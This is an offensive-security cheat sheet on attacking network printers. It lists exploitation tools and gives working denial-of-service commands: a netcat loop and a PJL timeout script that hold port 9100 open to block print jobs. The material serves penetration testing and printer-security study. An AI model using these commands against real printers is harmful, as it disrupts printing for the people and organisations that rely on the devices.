# printer-hacking

> Adapted from http://hacking-printers.net/

## Printer Hacking Tools

- [PRET](https://github.com/RUB-NDS/PRET) - Printer Exploitation Toolkit
- [Praeda](https://github.com/percx/Praeda) - Automated Printer Data Harvesting Tool
- [PFT & Hijetter](http://www.phenoelit.org/hp/) - One of the Early Network Printer Exploitation Tools
- [BeEF](https://github.com/beefproject/beef) - Browser Exploitation Framework that can be used for performing [Cross-site printing](http://hacking-printers.net/wiki/index.php/Cross-site_printing)

## Typical Steps

- perform [generic network assessment](http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html)
- information gathering with Praeda
- use the [cheatsheet](http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet) to find and exploit flaws
- use PRET for fun & profit

## Cheatsheet

### Denial of Service

#### [Transmission Channel](http://hacking-printers.net/wiki/index.php/Transmission_channel)

- TCP Protocol
- If print jobs are processed in series – which is assumed for most devices – only one job can be handled at a time.
- Setting high timeout value can effectively be used to enhance attack.
- Simple way with nc: `while true; do nc printer 9100; done`
- Set maximum timeout value as in following shell script:

```shell
# get maximum timeout value with PJL
MAX="`echo "@PJL INFO VARIABLES" | nc -w3 printer 9100 |\
  grep -E -A2 '^TIMEOUT=' | tail -n1 | awk '{print $1}'`"
# connect and set maximum timeout for current job with PJL
while true; do echo "@PJL SET TIMEOUT=$MAX" | nc printer 9100; done
```
- With PRET, a sample session to get timeout values would look like below:

```shell
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> env timeout
TIMEOUT=15 [2 RANGE]
       5
       300
```
